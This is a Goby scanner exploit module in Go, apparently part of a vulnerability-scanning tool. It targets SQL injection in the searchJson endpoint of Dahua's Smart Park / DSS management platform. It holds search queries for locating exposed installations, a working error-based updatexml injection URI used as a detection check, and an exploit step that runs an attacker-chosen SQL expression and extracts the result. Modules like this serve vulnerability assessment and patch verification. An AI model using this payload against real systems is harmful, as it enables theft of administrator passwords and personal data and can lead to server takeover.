package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dahua DSS searchJson SQL injection vulnerability",
    "Description": "<p>Dahua smart park solutions focus on multiple business areas such as operation management, comprehensive security, convenient traffic, and collaborative office. Relying on AI, Internet of Things, and big data technologies, the digital upgrade of park management can be realized to improve security levels, work efficiency, and management. Cost reduction.</p><p>There is a SQL injection vulnerability in searchJson, the comprehensive management platform of Dahua Smart Park. In addition to exploiting the SQL injection vulnerability, attackers can obtain information in the database (for example, administrator background passwords, personal information of site users), and even in high-privileged situations. Write a Trojan horse to the server to further obtain server system permissions.</p>",
    "Product": "dahua-Smart-Park-GMP",
    "Homepage": "https://www.dahuatech.com/product/info/5609.html",
    "DisclosureDate": "2023-02-22",
    "Author": "715827922@qq.com",
    "FofaQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "GobyQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in searchJson, the comprehensive management platform of Dahua Smart Park. In addition to exploiting the SQL injection vulnerability, attackers can obtain information in the database (for example, administrator background passwords, personal information of site users), and even in high-privileged situations. Write a Trojan horse to the server to further obtain server system permissions.</p>",
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"http://www.example.com\">https://www.dahuatech.com/cases/info/76.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": false,
    "ExpParams": [
        {
            "name": "query",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "1e469dbcb9211897b5f5ebf866c66f3",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20{{{query}}}),0x7e),1)--%22%7D/extend/%7B%7D",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~(.*?)~"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "大华智慧园区综合管理平台 searchJson SQL 注入漏洞",
            "Product": "dahua-智慧园区综合管理平台",
            "Description": "<p>大华智慧园区解决方案围绕运营管理、综合安防、便捷通行、协同办公等多个业务领域展开，依托AI、物联网、大数据技术实现园区管理数字化升级，实现安全等级提升、工作效率提升、管理成本下降。<br></p><p>大华智慧园区综合管理平台 searchJson 存在 SQL 注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.dahuatech.com/cases/info/76.html\" target=\"_blank\">https://www.dahuatech.com/cases/info/76.html</a></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dahua DSS searchJson SQL injection vulnerability",
            "Product": "dahua-Smart-Park-GMP",
            "Description": "<p>Dahua smart park solutions focus on multiple business areas such as operation management, comprehensive security, convenient traffic, and collaborative office. Relying on AI, Internet of Things, and big data technologies, the digital upgrade of park management can be realized to improve security levels, work efficiency, and management. Cost reduction.</p><p>There is a SQL injection vulnerability in searchJson, the comprehensive management platform of Dahua Smart Park. In addition to exploiting the SQL injection vulnerability, attackers can obtain information in the database (for example, administrator background passwords, personal information of site users), and even in high-privileged situations. Write a Trojan horse to the server to further obtain server system permissions.</p>",
            "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"http://www.example.com\" target=\"_blank\">https://www.dahuatech.com/cases/info/76.html</a><br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in searchJson, the comprehensive management platform of Dahua Smart Park. In addition to exploiting the SQL injection vulnerability, attackers can obtain information in the database (for example, administrator background passwords, personal information of site users), and even in high-privileged situations. Write a Trojan horse to the server to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-25",
    "PocId": "10809"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}